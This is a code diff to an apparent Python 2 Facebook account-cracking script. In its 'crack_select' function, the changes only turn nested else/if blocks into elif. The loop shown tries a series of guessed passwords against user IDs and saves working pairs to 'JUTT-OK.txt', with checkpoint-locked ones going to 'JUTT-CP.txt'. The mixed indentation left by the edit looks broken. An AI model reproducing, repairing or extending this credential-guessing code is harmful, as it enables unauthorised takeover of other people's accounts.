@@ -353,8 +353,7 @@ def crack_select():
 			        ok.write(uid + ' | ' + pass1 + '\n')
 			        ok.close()
 			        oks.append(uid + pass1)
-			else:
-				if 'www.facebook.com' in q['error_msg']:
+			elif 'www.facebook.com' in q['error_msg']:
 					print '\x1b[1;94m[JUTT-CP] ' + uid + ' | ' + pass1
 					cp = open('JUTT-CP.txt', 'a')
 					cp.write(uid + ' | ' + pass1+ '\n')
@@ -369,8 +368,7 @@ def crack_select():
                                                 ok = open('/sdcard/ids/JUTT-OK.txt', 'a')
                                                 ok.write(uid + ' | ' + pass2 + '\n')
 						oks.append(uid + pass2)
-					else:
-						if 'www.facebook.com' in q['error_msg']:
+					elif 'www.facebook.com' in q['error_msg']:
 							print '\x1b[1;94m[JUTT-CP] ' + uid + ' | ' + pass2
 							cp = open('JUTT-CP.txt', 'a')
 							cp.write(uid + ' | ' + pass2 + '\n')
@@ -386,8 +384,7 @@ def crack_select():
                                                                 ok.write(uid + ' | ' + pass3 + '\n')
                                                                 ok.close()
 								oks.append(uid + pass3)
-							else:
-								if 'www.facebook.com' in q['error_msg']:
+							elif 'www.facebook.com' in q['error_msg']:
 									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass3
 									cp = open("JUTT-CP.txt", "a")
 									cp.write(uid +"|" +pass3 + "\n")
@@ -403,8 +400,7 @@ def crack_select():
                                                                                 ok.write(uid + ' | ' + pass4 + '\n')
                                                                                 ok.close()
 										oks.append(uid + pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
+									elif 'www.facebook.com' in q["error_msg"]:
 											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass4
 											cp = open("JUTT-CP.txt", "a")
 											cp.write(uid +"|" + pass4 + "\n")
@@ -420,8 +416,7 @@ def crack_select():
                                                                                                 ok.write(uid + ' | ' + pass5 + '\n')
                                                                                                 ok.close()
 												oks.append(uid + pass5)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
+											elif 'www.facebook.com' in q["error_msg"]:
 													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass5
 													cp = open("JUTT-CP.txt", "a")
 													cp.write(uid + "|" + pass5 + "\n")
@@ -437,8 +432,7 @@ def crack_select():
                                                                                                                 ok.write(uid + ' | ' + pass6 + '\n')
                                                                                                                 ok.close()
 														oks.append(uid + pass6)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
+													elif 'www.facebook.com' in q["error_msg"]:
 															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass6
 															cp = open("JUTT-CP.txt", "a")
 															cp.write(uid + "|" + pass6 + "\n")
@@ -453,8 +447,7 @@ def crack_select():
                                                                                                                                 ok = open('/sdcard/ids/JUTT-OK.txt', 'a')
                                                                                                                                 ok.write(uid + ' | ' + pass7 + '\n')
 																oks.append(uid + pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
+															elif 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass7
 																	cp = open('JUTT-CP.txt', 'a')
 																	cp.write(uid + "|" + pass7 +"\n")
